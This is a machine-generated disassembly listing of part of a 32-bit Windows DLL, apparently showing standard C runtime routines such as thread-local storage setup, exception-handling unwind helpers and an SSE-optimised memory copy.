10003187:	74 27                	je     0x100031b0
10003189:	56                   	push   %esi
1000318a:	8b 75 08             	mov    0x8(%ebp),%esi
1000318d:	85 f6                	test   %esi,%esi
1000318f:	75 0e                	jne    0x1000319f
10003191:	50                   	push   %eax
10003192:	e8 86 09 00 00       	call   0x10003b1d
10003197:	8b f0                	mov    %eax,%esi
10003199:	a1 20 30 01 10       	mov    0x10013020,%eax
1000319e:	59                   	pop    %ecx
1000319f:	6a 00                	push   $0x0
100031a1:	50                   	push   %eax
100031a2:	e8 b1 09 00 00       	call   0x10003b58
100031a7:	59                   	pop    %ecx
100031a8:	59                   	pop    %ecx
100031a9:	56                   	push   %esi
100031aa:	e8 b1 ff ff ff       	call   0x10003160
100031af:	5e                   	pop    %esi
100031b0:	5d                   	pop    %ebp
100031b1:	c3                   	ret
100031b2:	e8 09 00 00 00       	call   0x100031c0
100031b7:	85 c0                	test   %eax,%eax
100031b9:	0f 84 e8 20 00 00    	je     0x100052a7
100031bf:	c3                   	ret
100031c0:	83 3d 20 30 01 10 ff 	cmpl   $0xffffffff,0x10013020
100031c7:	75 03                	jne    0x100031cc
100031c9:	33 c0                	xor    %eax,%eax
100031cb:	c3                   	ret
100031cc:	53                   	push   %ebx
100031cd:	57                   	push   %edi
100031ce:	ff 15 40 d0 00 10    	call   *0x1000d040
100031d4:	ff 35 20 30 01 10    	push   0x10013020
100031da:	8b f8                	mov    %eax,%edi
100031dc:	e8 3c 09 00 00       	call   0x10003b1d
100031e1:	8b d8                	mov    %eax,%ebx
100031e3:	59                   	pop    %ecx
100031e4:	83 fb ff             	cmp    $0xffffffff,%ebx
100031e7:	74 17                	je     0x10003200
100031e9:	85 db                	test   %ebx,%ebx
100031eb:	75 59                	jne    0x10003246
100031ed:	6a ff                	push   $0xffffffff
100031ef:	ff 35 20 30 01 10    	push   0x10013020
100031f5:	e8 5e 09 00 00       	call   0x10003b58
100031fa:	59                   	pop    %ecx
100031fb:	59                   	pop    %ecx
100031fc:	85 c0                	test   %eax,%eax
100031fe:	75 04                	jne    0x10003204
10003200:	33 db                	xor    %ebx,%ebx
10003202:	eb 42                	jmp    0x10003246
10003204:	56                   	push   %esi
10003205:	6a 28                	push   $0x28
10003207:	6a 01                	push   $0x1
10003209:	e8 5a 21 00 00       	call   0x10005368
1000320e:	8b f0                	mov    %eax,%esi
10003210:	59                   	pop    %ecx
10003211:	59                   	pop    %ecx
10003212:	85 f6                	test   %esi,%esi
10003214:	74 12                	je     0x10003228
10003216:	56                   	push   %esi
10003217:	ff 35 20 30 01 10    	push   0x10013020
1000321d:	e8 36 09 00 00       	call   0x10003b58
10003222:	59                   	pop    %ecx
10003223:	59                   	pop    %ecx
10003224:	85 c0                	test   %eax,%eax
10003226:	75 12                	jne    0x1000323a
10003228:	33 db                	xor    %ebx,%ebx
1000322a:	53                   	push   %ebx
1000322b:	ff 35 20 30 01 10    	push   0x10013020
10003231:	e8 22 09 00 00       	call   0x10003b58
10003236:	59                   	pop    %ecx
10003237:	59                   	pop    %ecx
10003238:	eb 04                	jmp    0x1000323e
1000323a:	8b de                	mov    %esi,%ebx
1000323c:	33 f6                	xor    %esi,%esi
1000323e:	56                   	push   %esi
1000323f:	e8 70 12 00 00       	call   0x100044b4
10003244:	59                   	pop    %ecx
10003245:	5e                   	pop    %esi
10003246:	57                   	push   %edi
10003247:	ff 15 94 d0 00 10    	call   *0x1000d094
1000324d:	5f                   	pop    %edi
1000324e:	8b c3                	mov    %ebx,%eax
10003250:	5b                   	pop    %ebx
10003251:	c3                   	ret
10003252:	68 60 31 00 10       	push   $0x10003160
10003257:	e8 4b 08 00 00       	call   0x10003aa7
1000325c:	a3 20 30 01 10       	mov    %eax,0x10013020
10003261:	59                   	pop    %ecx
10003262:	83 f8 ff             	cmp    $0xffffffff,%eax
10003265:	75 03                	jne    0x1000326a
10003267:	32 c0                	xor    %al,%al
10003269:	c3                   	ret
1000326a:	68 b0 40 01 10       	push   $0x100140b0
1000326f:	50                   	push   %eax
10003270:	e8 e3 08 00 00       	call   0x10003b58
10003275:	59                   	pop    %ecx
10003276:	59                   	pop    %ecx
10003277:	85 c0                	test   %eax,%eax
10003279:	75 07                	jne    0x10003282
1000327b:	e8 05 00 00 00       	call   0x10003285
10003280:	eb e5                	jmp    0x10003267
10003282:	b0 01                	mov    $0x1,%al
10003284:	c3                   	ret
10003285:	a1 20 30 01 10       	mov    0x10013020,%eax
1000328a:	83 f8 ff             	cmp    $0xffffffff,%eax
1000328d:	74 0e                	je     0x1000329d
1000328f:	50                   	push   %eax
10003290:	e8 4d 08 00 00       	call   0x10003ae2
10003295:	83 0d 20 30 01 10 ff 	orl    $0xffffffff,0x10013020
1000329c:	59                   	pop    %ecx
1000329d:	b0 01                	mov    $0x1,%al
1000329f:	c3                   	ret
100032a0:	56                   	push   %esi
100032a1:	57                   	push   %edi
100032a2:	bf d8 40 01 10       	mov    $0x100140d8,%edi
100032a7:	33 f6                	xor    %esi,%esi
100032a9:	6a 00                	push   $0x0
100032ab:	68 a0 0f 00 00       	push   $0xfa0
100032b0:	57                   	push   %edi
100032b1:	e8 e0 08 00 00       	call   0x10003b96
100032b6:	83 c4 0c             	add    $0xc,%esp
100032b9:	85 c0                	test   %eax,%eax
100032bb:	74 15                	je     0x100032d2
100032bd:	ff 05 f0 40 01 10    	incl   0x100140f0
100032c3:	83 c6 18             	add    $0x18,%esi
100032c6:	83 c7 18             	add    $0x18,%edi
100032c9:	83 fe 18             	cmp    $0x18,%esi
100032cc:	72 db                	jb     0x100032a9
100032ce:	b0 01                	mov    $0x1,%al
100032d0:	eb 07                	jmp    0x100032d9
100032d2:	e8 05 00 00 00       	call   0x100032dc
100032d7:	32 c0                	xor    %al,%al
100032d9:	5f                   	pop    %edi
100032da:	5e                   	pop    %esi
100032db:	c3                   	ret
100032dc:	56                   	push   %esi
100032dd:	8b 35 f0 40 01 10    	mov    0x100140f0,%esi
100032e3:	85 f6                	test   %esi,%esi
100032e5:	74 20                	je     0x10003307
100032e7:	6b c6 18             	imul   $0x18,%esi,%eax
100032ea:	57                   	push   %edi
100032eb:	8d b8 c0 40 01 10    	lea    0x100140c0(%eax),%edi
100032f1:	57                   	push   %edi
100032f2:	ff 15 a0 d0 00 10    	call   *0x1000d0a0
100032f8:	ff 0d f0 40 01 10    	decl   0x100140f0
100032fe:	83 ef 18             	sub    $0x18,%edi
10003301:	83 ee 01             	sub    $0x1,%esi
10003304:	75 eb                	jne    0x100032f1
10003306:	5f                   	pop    %edi
10003307:	b0 01                	mov    $0x1,%al
10003309:	5e                   	pop    %esi
1000330a:	c3                   	ret
1000330b:	cc                   	int3
1000330c:	cc                   	int3
1000330d:	cc                   	int3
1000330e:	cc                   	int3
1000330f:	cc                   	int3
10003310:	55                   	push   %ebp
10003311:	8b ec                	mov    %esp,%ebp
10003313:	53                   	push   %ebx
10003314:	56                   	push   %esi
10003315:	57                   	push   %edi
10003316:	55                   	push   %ebp
10003317:	6a 00                	push   $0x0
10003319:	6a 00                	push   $0x0
1000331b:	68 29 33 00 10       	push   $0x10003329
10003320:	ff 75 08             	push   0x8(%ebp)
10003323:	ff 15 90 d0 00 10    	call   *0x1000d090
10003329:	5d                   	pop    %ebp
1000332a:	5f                   	pop    %edi
1000332b:	5e                   	pop    %esi
1000332c:	5b                   	pop    %ebx
1000332d:	8b e5                	mov    %ebp,%esp
1000332f:	5d                   	pop    %ebp
10003330:	c3                   	ret
10003331:	8b 4c 24 04          	mov    0x4(%esp),%ecx
10003335:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
1000333c:	b8 01 00 00 00       	mov    $0x1,%eax
10003341:	74 32                	je     0x10003375
10003343:	8b 44 24 14          	mov    0x14(%esp),%eax
10003347:	8b 48 fc             	mov    -0x4(%eax),%ecx
1000334a:	33 c8                	xor    %eax,%ecx
1000334c:	e8 38 e9 ff ff       	call   0x10001c89
10003351:	55                   	push   %ebp
10003352:	8b 68 10             	mov    0x10(%eax),%ebp
10003355:	8b 50 28             	mov    0x28(%eax),%edx
10003358:	52                   	push   %edx
10003359:	8b 50 24             	mov    0x24(%eax),%edx
1000335c:	52                   	push   %edx
1000335d:	e8 14 00 00 00       	call   0x10003376
10003362:	83 c4 08             	add    $0x8,%esp
10003365:	5d                   	pop    %ebp
10003366:	8b 44 24 08          	mov    0x8(%esp),%eax
1000336a:	8b 54 24 10          	mov    0x10(%esp),%edx
1000336e:	89 02                	mov    %eax,(%edx)
10003370:	b8 03 00 00 00       	mov    $0x3,%eax
10003375:	c3                   	ret
10003376:	53                   	push   %ebx
10003377:	56                   	push   %esi
10003378:	57                   	push   %edi
10003379:	8b 44 24 10          	mov    0x10(%esp),%eax
1000337d:	55                   	push   %ebp
1000337e:	50                   	push   %eax
1000337f:	6a fe                	push   $0xfffffffe
10003381:	68 31 33 00 10       	push   $0x10003331
10003386:	64 ff 35 00 00 00 00 	push   %fs:0x0
1000338d:	a1 04 30 01 10       	mov    0x10013004,%eax
10003392:	33 c4                	xor    %esp,%eax
10003394:	50                   	push   %eax
10003395:	8d 44 24 04          	lea    0x4(%esp),%eax
10003399:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
1000339f:	8b 44 24 28          	mov    0x28(%esp),%eax
100033a3:	8b 58 08             	mov    0x8(%eax),%ebx
100033a6:	8b 70 0c             	mov    0xc(%eax),%esi
100033a9:	83 fe ff             	cmp    $0xffffffff,%esi
100033ac:	74 3a                	je     0x100033e8
100033ae:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
100033b3:	74 06                	je     0x100033bb
100033b5:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
100033b9:	76 2d                	jbe    0x100033e8
100033bb:	8d 34 76             	lea    (%esi,%esi,2),%esi
100033be:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
100033c1:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
100033c5:	89 48 0c             	mov    %ecx,0xc(%eax)
100033c8:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
100033cd:	75 17                	jne    0x100033e6
100033cf:	68 01 01 00 00       	push   $0x101
100033d4:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
100033d8:	e8 4f 00 00 00       	call   0x1000342c
100033dd:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
100033e1:	e8 65 00 00 00       	call   0x1000344b
100033e6:	eb b7                	jmp    0x1000339f
100033e8:	8b 4c 24 04          	mov    0x4(%esp),%ecx
100033ec:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
100033f3:	83 c4 18             	add    $0x18,%esp
100033f6:	5f                   	pop    %edi
100033f7:	5e                   	pop    %esi
100033f8:	5b                   	pop    %ebx
100033f9:	c3                   	ret
100033fa:	33 c0                	xor    %eax,%eax
100033fc:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
10003403:	81 79 04 31 33 00 10 	cmpl   $0x10003331,0x4(%ecx)
1000340a:	75 10                	jne    0x1000341c
1000340c:	8b 51 0c             	mov    0xc(%ecx),%edx
1000340f:	8b 52 0c             	mov    0xc(%edx),%edx
10003412:	39 51 08             	cmp    %edx,0x8(%ecx)
10003415:	75 05                	jne    0x1000341c
10003417:	b8 01 00 00 00       	mov    $0x1,%eax
1000341c:	c3                   	ret
1000341d:	8d 49 00             	lea    0x0(%ecx),%ecx
10003420:	53                   	push   %ebx
10003421:	51                   	push   %ecx
10003422:	bb 30 30 01 10       	mov    $0x10013030,%ebx
10003427:	eb 0e                	jmp    0x10003437
10003429:	8d 49 00             	lea    0x0(%ecx),%ecx
1000342c:	53                   	push   %ebx
1000342d:	51                   	push   %ecx
1000342e:	bb 30 30 01 10       	mov    $0x10013030,%ebx
10003433:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
10003437:	89 4b 08             	mov    %ecx,0x8(%ebx)
1000343a:	89 43 04             	mov    %eax,0x4(%ebx)
1000343d:	89 6b 0c             	mov    %ebp,0xc(%ebx)
10003440:	55                   	push   %ebp
10003441:	51                   	push   %ecx
10003442:	50                   	push   %eax
10003443:	58                   	pop    %eax
10003444:	59                   	pop    %ecx
10003445:	5d                   	pop    %ebp
10003446:	59                   	pop    %ecx
10003447:	5b                   	pop    %ebx
10003448:	c2 04 00             	ret    $0x4
1000344b:	ff d0                	call   *%eax
1000344d:	c3                   	ret
1000344e:	cc                   	int3
1000344f:	cc                   	int3
10003450:	57                   	push   %edi
10003451:	56                   	push   %esi
10003452:	8b 74 24 10          	mov    0x10(%esp),%esi
10003456:	8b 4c 24 14          	mov    0x14(%esp),%ecx
1000345a:	8b 7c 24 0c          	mov    0xc(%esp),%edi
1000345e:	8b c1                	mov    %ecx,%eax
10003460:	8b d1                	mov    %ecx,%edx
10003462:	03 c6                	add    %esi,%eax
10003464:	3b fe                	cmp    %esi,%edi
10003466:	76 08                	jbe    0x10003470
10003468:	3b f8                	cmp    %eax,%edi
1000346a:	0f 82 94 02 00 00    	jb     0x10003704
10003470:	83 f9 20             	cmp    $0x20,%ecx
10003473:	0f 82 d2 04 00 00    	jb     0x1000394b
10003479:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
1000347f:	73 13                	jae    0x10003494
10003481:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
10003488:	01 
10003489:	0f 82 8e 04 00 00    	jb     0x1000391d
1000348f:	e9 e3 01 00 00       	jmp    0x10003677
10003494:	0f ba 25 6c 40 01 10 	btl    $0x1,0x1001406c
1000349b:	01 
1000349c:	73 09                	jae    0x100034a7
1000349e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
100034a0:	8b 44 24 0c          	mov    0xc(%esp),%eax
100034a4:	5e                   	pop    %esi
100034a5:	5f                   	pop    %edi
100034a6:	c3                   	ret
100034a7:	8b c7                	mov    %edi,%eax
100034a9:	33 c6                	xor    %esi,%eax
100034ab:	a9 0f 00 00 00       	test   $0xf,%eax
100034b0:	75 0e                	jne    0x100034c0
100034b2:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
100034b9:	01 
100034ba:	0f 82 e0 03 00 00    	jb     0x100038a0
100034c0:	0f ba 25 6c 40 01 10 	btl    $0x0,0x1001406c
100034c7:	00 
100034c8:	0f 83 a9 01 00 00    	jae    0x10003677
100034ce:	f7 c7 03 00 00 00    	test   $0x3,%edi
100034d4:	0f 85 9d 01 00 00    	jne    0x10003677
100034da:	f7 c6 03 00 00 00    	test   $0x3,%esi
100034e0:	0f 85 ac 01 00 00    	jne    0x10003692
100034e6:	0f ba e7 02          	bt     $0x2,%edi
100034ea:	73 0d                	jae    0x100034f9
100034ec:	8b 06                	mov    (%esi),%eax
100034ee:	83 e9 04             	sub    $0x4,%ecx
100034f1:	8d 76 04             	lea    0x4(%esi),%esi
100034f4:	89 07                	mov    %eax,(%edi)
100034f6:	8d 7f 04             	lea    0x4(%edi),%edi
100034f9:	0f ba e7 03          	bt     $0x3,%edi
100034fd:	73 11                	jae    0x10003510
100034ff:	f3 0f 7e 0e          	movq   (%esi),%xmm1
10003503:	83 e9 08             	sub    $0x8,%ecx
10003506:	8d 76 08             	lea    0x8(%esi),%esi
10003509:	66 0f d6 0f          	movq   %xmm1,(%edi)
1000350d:	8d 7f 08             	lea    0x8(%edi),%edi
10003510:	f7 c6 07 00 00 00    	test   $0x7,%esi
10003516:	74 65                	je     0x1000357d
10003518:	0f ba e6 03          	bt     $0x3,%esi
1000351c:	0f 83 b4 00 00 00    	jae    0x100035d6
10003522:	66 0f 6f 4e f4       	movdqa -0xc(%esi),%xmm1
10003527:	8d 76 f4             	lea    -0xc(%esi),%esi
1000352a:	8b ff                	mov    %edi,%edi
1000352c:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
10003531:	83 e9 30             	sub    $0x30,%ecx
10003534:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
10003539:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
1000353e:	8d 76 30             	lea    0x30(%esi),%esi
10003541:	83 f9 30             	cmp    $0x30,%ecx
10003544:	66 0f 6f d3          	movdqa %xmm3,%xmm2
10003548:	66 0f 3a 0f d9 0c    	palignr $0xc,%xmm1,%xmm3
1000354e:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
10003552:	66 0f 6f e0          	movdqa %xmm0,%xmm4
10003556:	66 0f 3a 0f c2 0c    	palignr $0xc,%xmm2,%xmm0
1000355c:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10003561:	66 0f 6f cd          	movdqa %xmm5,%xmm1
10003565:	66 0f 3a 0f ec 0c    	palignr $0xc,%xmm4,%xmm5
1000356b:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
10003570:	8d 7f 30             	lea    0x30(%edi),%edi
10003573:	73 b7                	jae    0x1000352c
10003575:	8d 76 0c             	lea    0xc(%esi),%esi
10003578:	e9 af 00 00 00       	jmp    0x1000362c
1000357d:	66 0f 6f 4e f8       	movdqa -0x8(%esi),%xmm1
10003582:	8d 76 f8             	lea    -0x8(%esi),%esi
10003585:	8d 49 00             	lea    0x0(%ecx),%ecx
10003588:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
1000358d:	83 e9 30             	sub    $0x30,%ecx
10003590:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
10003595:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
1000359a:	8d 76 30             	lea    0x30(%esi),%esi
1000359d:	83 f9 30             	cmp    $0x30,%ecx
100035a0:	66 0f 6f d3          	movdqa %xmm3,%xmm2
100035a4:	66 0f 3a 0f d9 08    	palignr $0x8,%xmm1,%xmm3
100035aa:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
100035ae:	66 0f 6f e0          	movdqa %xmm0,%xmm4
100035b2:	66 0f 3a 0f c2 08    	palignr $0x8,%xmm2,%xmm0
100035b8:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
100035bd:	66 0f 6f cd          	movdqa %xmm5,%xmm1
100035c1:	66 0f 3a 0f ec 08    	palignr $0x8,%xmm4,%xmm5
100035c7:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
100035cc:	8d 7f 30             	lea    0x30(%edi),%edi
100035cf:	73 b7                	jae    0x10003588
100035d1:	8d 76 08             	lea    0x8(%esi),%esi
100035d4:	eb 56                	jmp    0x1000362c
100035d6:	66 0f 6f 4e fc       	movdqa -0x4(%esi),%xmm1
100035db:	8d 76 fc             	lea    -0x4(%esi),%esi
100035de:	8b ff                	mov    %edi,%edi
100035e0:	66 0f 6f 5e 10       	movdqa 0x10(%esi),%xmm3
100035e5:	83 e9 30             	sub    $0x30,%ecx
100035e8:	66 0f 6f 46 20       	movdqa 0x20(%esi),%xmm0
100035ed:	66 0f 6f 6e 30       	movdqa 0x30(%esi),%xmm5
100035f2:	8d 76 30             	lea    0x30(%esi),%esi
100035f5:	83 f9 30             	cmp    $0x30,%ecx
100035f8:	66 0f 6f d3          	movdqa %xmm3,%xmm2
100035fc:	66 0f 3a 0f d9 04    	palignr $0x4,%xmm1,%xmm3
10003602:	66 0f 7f 1f          	movdqa %xmm3,(%edi)
10003606:	66 0f 6f e0          	movdqa %xmm0,%xmm4
1000360a:	66 0f 3a 0f c2 04    	palignr $0x4,%xmm2,%xmm0
10003610:	66 0f 7f 47 10       	movdqa %xmm0,0x10(%edi)
10003615:	66 0f 6f cd          	movdqa %xmm5,%xmm1
10003619:	66 0f 3a 0f ec 04    	palignr $0x4,%xmm4,%xmm5
1000361f:	66 0f 7f 6f 20       	movdqa %xmm5,0x20(%edi)
10003624:	8d 7f 30             	lea    0x30(%edi),%edi
10003627:	73 b7                	jae    0x100035e0
10003629:	8d 76 04             	lea    0x4(%esi),%esi
1000362c:	83 f9 10             	cmp    $0x10,%ecx
1000362f:	72 13                	jb     0x10003644
10003631:	f3 0f 6f 0e          	movdqu (%esi),%xmm1
10003635:	83 e9 10             	sub    $0x10,%ecx
10003638:	8d 76 10             	lea    0x10(%esi),%esi
1000363b:	66 0f 7f 0f          	movdqa %xmm1,(%edi)
1000363f:	8d 7f 10             	lea    0x10(%edi),%edi
10003642:	eb e8                	jmp    0x1000362c
10003644:	0f ba e1 02          	bt     $0x2,%ecx
10003648:	73 0d                	jae    0x10003657
1000364a:	8b 06                	mov    (%esi),%eax
1000364c:	83 e9 04             	sub    $0x4,%ecx
1000364f:	8d 76 04             	lea    0x4(%esi),%esi
10003652:	89 07                	mov    %eax,(%edi)
10003654:	8d 7f 04             	lea    0x4(%edi),%edi
10003657:	0f ba e1 03          	bt     $0x3,%ecx
1000365b:	73 11                	jae    0x1000366e
1000365d:	f3 0f 7e 0e          	movq   (%esi),%xmm1
10003661:	83 e9 08             	sub    $0x8,%ecx
10003664:	8d 76 08             	lea    0x8(%esi),%esi
10003667:	66 0f d6 0f          	movq   %xmm1,(%edi)
1000366b:	8d 7f 08             	lea    0x8(%edi),%edi
1000366e:	8b 04 8d b4 36 00 10 	mov    0x100036b4(,%ecx,4),%eax
10003675:	ff e0                	jmp    *%eax
10003677:	f7 c7 03 00 00 00    	test   $0x3,%edi
1000367d:	74 13                	je     0x10003692
1000367f:	8a 06                	mov    (%esi),%al
10003681:	88 07                	mov    %al,(%edi)
10003683:	49                   	dec    %ecx
10003684:	83 c6 01             	add    $0x1,%esi
10003687:	83 c7 01             	add    $0x1,%edi
1000368a:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003690:	75 ed                	jne    0x1000367f
10003692:	8b d1                	mov    %ecx,%edx
10003694:	83 f9 20             	cmp    $0x20,%ecx
10003697:	0f 82 ae 02 00 00    	jb     0x1000394b
1000369d:	c1 e9 02             	shr    $0x2,%ecx
100036a0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
100036a2:	83 e2 03             	and    $0x3,%edx
100036a5:	ff 24 95 b4 36 00 10 	jmp    *0x100036b4(,%edx,4)
100036ac:	ff 24 8d c4 36 00 10 	jmp    *0x100036c4(,%ecx,4)
100036b3:	90                   	nop
100036b4:	c4 36                	les    (%esi),%esi
100036b6:	00 10                	add    %dl,(%eax)
100036b8:	cc                   	int3
100036b9:	36 00 10             	add    %dl,%ss:(%eax)
100036bc:	d8 36                	fdivs  (%esi)
100036be:	00 10                	add    %dl,(%eax)
100036c0:	ec                   	in     (%dx),%al
100036c1:	36 00 10             	add    %dl,%ss:(%eax)
100036c4:	8b 44 24 0c          	mov    0xc(%esp),%eax
100036c8:	5e                   	pop    %esi
100036c9:	5f                   	pop    %edi
100036ca:	c3                   	ret
100036cb:	90                   	nop
100036cc:	8a 06                	mov    (%esi),%al
100036ce:	88 07                	mov    %al,(%edi)
100036d0:	8b 44 24 0c          	mov    0xc(%esp),%eax
100036d4:	5e                   	pop    %esi
100036d5:	5f                   	pop    %edi
100036d6:	c3                   	ret
100036d7:	90                   	nop
100036d8:	8a 06                	mov    (%esi),%al
100036da:	88 07                	mov    %al,(%edi)
100036dc:	8a 46 01             	mov    0x1(%esi),%al
100036df:	88 47 01             	mov    %al,0x1(%edi)
100036e2:	8b 44 24 0c          	mov    0xc(%esp),%eax
100036e6:	5e                   	pop    %esi
100036e7:	5f                   	pop    %edi
100036e8:	c3                   	ret
100036e9:	8d 49 00             	lea    0x0(%ecx),%ecx
100036ec:	8a 06                	mov    (%esi),%al
100036ee:	88 07                	mov    %al,(%edi)
100036f0:	8a 46 01             	mov    0x1(%esi),%al
100036f3:	88 47 01             	mov    %al,0x1(%edi)
100036f6:	8a 46 02             	mov    0x2(%esi),%al
100036f9:	88 47 02             	mov    %al,0x2(%edi)
100036fc:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003700:	5e                   	pop    %esi
10003701:	5f                   	pop    %edi
10003702:	c3                   	ret
10003703:	90                   	nop
10003704:	8d 34 0e             	lea    (%esi,%ecx,1),%esi
10003707:	8d 3c 0f             	lea    (%edi,%ecx,1),%edi
1000370a:	83 f9 20             	cmp    $0x20,%ecx
1000370d:	0f 82 51 01 00 00    	jb     0x10003864
10003713:	0f ba 25 10 30 01 10 	btl    $0x1,0x10013010
1000371a:	01 
1000371b:	0f 82 94 00 00 00    	jb     0x100037b5
10003721:	f7 c7 03 00 00 00    	test   $0x3,%edi
10003727:	74 14                	je     0x1000373d
10003729:	8b d7                	mov    %edi,%edx
1000372b:	83 e2 03             	and    $0x3,%edx
1000372e:	2b ca                	sub    %edx,%ecx
10003730:	8a 46 ff             	mov    -0x1(%esi),%al
10003733:	88 47 ff             	mov    %al,-0x1(%edi)
10003736:	4e                   	dec    %esi
10003737:	4f                   	dec    %edi
10003738:	83 ea 01             	sub    $0x1,%edx
1000373b:	75 f3                	jne    0x10003730
1000373d:	83 f9 20             	cmp    $0x20,%ecx
10003740:	0f 82 1e 01 00 00    	jb     0x10003864
10003746:	8b d1                	mov    %ecx,%edx
10003748:	c1 e9 02             	shr    $0x2,%ecx
1000374b:	83 e2 03             	and    $0x3,%edx
1000374e:	83 ee 04             	sub    $0x4,%esi
10003751:	83 ef 04             	sub    $0x4,%edi
10003754:	fd                   	std
10003755:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
10003757:	fc                   	cld
10003758:	ff 24 95 60 37 00 10 	jmp    *0x10003760(,%edx,4)
1000375f:	90                   	nop
10003760:	70 37                	jo     0x10003799
10003762:	00 10                	add    %dl,(%eax)
10003764:	78 37                	js     0x1000379d
10003766:	00 10                	add    %dl,(%eax)
10003768:	88 37                	mov    %dh,(%edi)
1000376a:	00 10                	add    %dl,(%eax)
1000376c:	9c                   	pushf
1000376d:	37                   	aaa
1000376e:	00 10                	add    %dl,(%eax)
10003770:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003774:	5e                   	pop    %esi
10003775:	5f                   	pop    %edi
10003776:	c3                   	ret
10003777:	90                   	nop
10003778:	8a 46 03             	mov    0x3(%esi),%al
1000377b:	88 47 03             	mov    %al,0x3(%edi)
1000377e:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003782:	5e                   	pop    %esi
10003783:	5f                   	pop    %edi
10003784:	c3                   	ret
10003785:	8d 49 00             	lea    0x0(%ecx),%ecx
10003788:	8a 46 03             	mov    0x3(%esi),%al
1000378b:	88 47 03             	mov    %al,0x3(%edi)
1000378e:	8a 46 02             	mov    0x2(%esi),%al
10003791:	88 47 02             	mov    %al,0x2(%edi)
10003794:	8b 44 24 0c          	mov    0xc(%esp),%eax
10003798:	5e                   	pop    %esi
10003799:	5f                   	pop    %edi
1000379a:	c3                   	ret
1000379b:	90                   	nop
1000379c:	8a 46 03             	mov    0x3(%esi),%al
1000379f:	88 47 03             	mov    %al,0x3(%edi)
100037a2:	8a 46 02             	mov    0x2(%esi),%al
100037a5:	88 47 02             	mov    %al,0x2(%edi)
100037a8:	8a 46 01             	mov    0x1(%esi),%al
100037ab:	88 47 01             	mov    %al,0x1(%edi)
100037ae:	8b 44 24 0c          	mov    0xc(%esp),%eax
100037b2:	5e                   	pop    %esi
100037b3:	5f                   	pop    %edi
100037b4:	c3                   	ret
100037b5:	f7 c7 0f 00 00 00    	test   $0xf,%edi
100037bb:	74 0f                	je     0x100037cc
100037bd:	49                   	dec    %ecx
100037be:	4e                   	dec    %esi
100037bf:	4f                   	dec    %edi
100037c0:	8a 06                	mov    (%esi),%al
100037c2:	88 07                	mov    %al,(%edi)
100037c4:	f7 c7 0f 00 00 00    	test   $0xf,%edi
100037ca:	75 f1                	jne    0x100037bd
100037cc:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
100037d2:	72 68                	jb     0x1000383c
100037d4:	81 ee 80 00 00 00    	sub    $0x80,%esi
100037da:	81 ef 80 00 00 00    	sub    $0x80,%edi
100037e0:	f3 0f 6f 06          	movdqu (%esi),%xmm0
100037e4:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
100037e9:	f3 0f 6f 56 20       	movdqu 0x20(%esi),%xmm2
100037ee:	f3 0f 6f 5e 30       	movdqu 0x30(%esi),%xmm3
100037f3:	f3 0f 6f 66 40       	movdqu 0x40(%esi),%xmm4
100037f8:	f3 0f 6f 6e 50       	movdqu 0x50(%esi),%xmm5
100037fd:	f3 0f 6f 76 60       	movdqu 0x60(%esi),%xmm6
10003802:	f3 0f 6f 7e 70       	movdqu 0x70(%esi),%xmm7
10003807:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
1000380b:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10003810:	f3 0f 7f 57 20       	movdqu %xmm2,0x20(%edi)
10003815:	f3 0f 7f 5f 30       	movdqu %xmm3,0x30(%edi)
1000381a:	f3 0f 7f 67 40       	movdqu %xmm4,0x40(%edi)
1000381f:	f3 0f 7f 6f 50       	movdqu %xmm5,0x50(%edi)
10003824:	f3 0f 7f 77 60       	movdqu %xmm6,0x60(%edi)
10003829:	f3 0f 7f 7f 70       	movdqu %xmm7,0x70(%edi)
1000382e:	81 e9 80 00 00 00    	sub    $0x80,%ecx
10003834:	f7 c1 80 ff ff ff    	test   $0xffffff80,%ecx
1000383a:	75 90                	jne    0x100037cc
1000383c:	83 f9 20             	cmp    $0x20,%ecx
1000383f:	72 23                	jb     0x10003864
10003841:	83 ee 20             	sub    $0x20,%esi
10003844:	83 ef 20             	sub    $0x20,%edi
10003847:	f3 0f 6f 06          	movdqu (%esi),%xmm0
1000384b:	f3 0f 6f 4e 10       	movdqu 0x10(%esi),%xmm1
10003850:	f3 0f 7f 07          	movdqu %xmm0,(%edi)
10003854:	f3 0f 7f 4f 10       	movdqu %xmm1,0x10(%edi)
10003859:	83 e9 20             	sub    $0x20,%ecx
1000385c:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
